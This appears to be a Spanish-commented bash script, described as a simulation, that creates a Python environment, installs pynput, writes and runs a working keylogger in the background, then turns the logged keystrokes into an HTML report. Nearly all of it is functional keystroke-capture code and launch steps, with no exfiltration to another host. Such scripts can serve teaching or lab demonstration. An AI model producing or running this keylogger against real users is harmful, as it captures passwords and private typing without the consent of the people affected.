#!/bin/bash

# keylogger.sh
# Script simular captura de teclas con reporte HTML

GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}[+] Creando entorno virtual...${NC}"
python3 -m venv venv-keylogger
source venv-keylogger/bin/activate

echo -e "${GREEN}[+] Instalando pynput...${NC}"
pip install pynput

echo -e "${GREEN}[+] Creando script keylogger.py...${NC}"
cat << 'EOF' > keylogger.py
#!/usr/bin/env python3
from pynput import keyboard

log_file = "captura_teclas.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
EOF

chmod +x keylogger.py

echo -e "${GREEN}[+] Ejecutando keylogger (Ctrl+C para detener)...${NC}"
nohup venv-keylogger/bin/python keylogger.py > /dev/null 2>&1 &
PID=$!
sleep 2
echo -e "${GREEN}[+] Keylogger corriendo con PID: $PID${NC}"

# Esperar la ejecución del keylogger
read -p $'\nPresiona ENTER para detener el keylogger y generar el reporte...\n'

echo -e "${GREEN}[+] Deteniendo keylogger...${NC}"
kill $PID

# Generar el reporte HTML
echo -e "${GREEN}[+] Generando reporte HTML...${NC}"
python3 << 'END'
import os
from datetime import datetime

log_file = "captura_teclas.txt"
if not os.path.exists(log_file):
    open(log_file, "w").close()

with open(log_file, "r") as f:
    data = f.read()

total_chars = len(data)
total_words = len(data.split())
fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

html_content = f"""
<!DOCTYPE html>
<html lang='es'>
<head>
<meta charset='UTF-8'>
<title>Reporte Keylogger</title>
<style>
body {{ font-family: Arial; background: #f4f4f4; padding: 30px; }}
.container {{ background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px #ccc; }}
.logbox {{ background: #eee; padding: 10px; border-radius: 5px; white-space: pre-wrap; font-family: monospace; }}
</style>
</head>
<body>
<div class='container'>
    <h1>Reporte de Captura de Teclas</h1>
    <p><strong>Fecha:</strong> {fecha}</p>
    <p><strong>Total de caracteres:</strong> {total_chars}</p>
    <p><strong>Total de palabras:</strong> {total_words}</p>
    <h3>Contenido capturado:</h3>
    <div class='logbox'>{data}</div>
</div>
</body>
</html>
"""

with open("reporte_keylogger.html", "w") as f:
    f.write(html_content)
print("✔ Reporte generado: reporte_keylogger.html")
END

echo -e "${GREEN}[✔] Script finalizado. Puedes abrir el reporte con:${NC} firefox reporte_keylogger.html"
